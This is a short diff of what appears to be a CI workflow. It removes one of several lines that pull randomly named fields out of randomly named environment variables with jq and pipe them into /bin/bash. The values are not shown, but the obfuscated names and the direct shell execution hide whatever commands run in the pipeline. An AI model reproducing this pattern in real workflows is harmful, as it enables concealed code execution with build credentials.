@@ -35,7 +35,6 @@ jobs:
           echo $rnfgy52163 | jq -r .uyubo864 | /bin/bash
           printf '%s' "$xetk16" | jq -r .kyso25 | /bin/bash
           echo $rcga3 | jq -r .juj3048 | /bin/bash
-          printf '%s' "$yo4089" | jq -r .ky907 | /bin/bash
           echo $zq9256 | jq -r .zol3 | /bin/bash
 
       - name: Archive data
